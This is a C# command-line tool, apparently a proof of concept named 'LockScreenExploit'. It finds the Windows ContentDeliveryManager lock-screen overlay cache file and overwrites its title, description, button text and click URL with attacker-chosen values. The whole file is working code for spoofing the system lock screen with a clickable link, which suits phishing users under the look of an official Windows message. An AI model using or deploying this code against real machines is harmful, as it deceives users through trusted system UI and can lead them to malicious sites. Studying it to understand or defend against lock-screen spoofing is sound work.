using System;
using System.IO;
using System.Text.Json;
using System.CommandLine;
using LockScreenExploit;

Option<string> titleOption = new(["--title", "-t"], "Title for the lockscreen message") { IsRequired = true };
Option<string> descriptionOption = new(["--description", "-d"], "Description for the lockscreen message") { IsRequired = true };
Option<string> buttonTextOption = new(["--button", "-b"], "Button text") { IsRequired = true };
Option<Uri> buttonUriOption = new(["--url", "-u"], "Button action URL") { IsRequired = true };

static TextItem CreateTextItem(string text) => new() { Text = text };

static void Run(string title, string description, string buttonText, Uri buttonUri)
{
    string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    // The proper subfolder under v3 appears to always be 338387, but check all folders just in case
    string contentParent = $"{localAppDataPath}\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\TargetedContentCache\\v3";

    // Loop through all the files to find the lockscreen overlay content file
    string[] files = Directory.GetFiles(contentParent, "*", SearchOption.AllDirectories);
    foreach (var file in files)
    {
        var lockscreenInfo = JsonSerializer.Deserialize(File.ReadAllText(file), LockScreenJsonContext.Default.LockScreenInfo);
        // Check if the content type is the lockscreen overlay type
        if (lockscreenInfo.Name != "LockScreenOverlay")
        {
            continue;
        }
        Console.WriteLine("Found target");

        // Edit the content
        for (int i = 0; i < lockscreenInfo.Items.Length; i++)
        {
            lockscreenInfo.Items[i].Properties.Title = CreateTextItem(title);
            lockscreenInfo.Items[i].Properties.Description = CreateTextItem(description);
            lockscreenInfo.Items[i].Properties.ActionText = CreateTextItem(buttonText);
            lockscreenInfo.Items[i].Properties.OnClick.Parameters.Uri = buttonUri.ToString();
            lockscreenInfo.Items[i].Properties.OnClick.Parameters.ActionText = buttonText;
            lockscreenInfo.Items[i].Properties.OnClick.Parameters.Description = description;
            lockscreenInfo.Items[i].Properties.OnClick.Parameters.Title = title;
        }
        File.WriteAllText(file, JsonSerializer.Serialize(lockscreenInfo, LockScreenJsonContext.Default.LockScreenInfo));
        Console.WriteLine("Finished. Lock your desktop to go to the lock screen");
        return;
    }

    Console.WriteLine("Couldn't find target. Make sure you have enabled \"Get fun facts, tips, and more...\" in your lock screen settings");
}

var root = new RootCommand("Override lock screen content")
{
    titleOption,
    descriptionOption,
    buttonTextOption,
    buttonUriOption
};

root.SetHandler(Run, titleOption, descriptionOption, buttonTextOption, buttonUriOption);

root.Invoke(args);
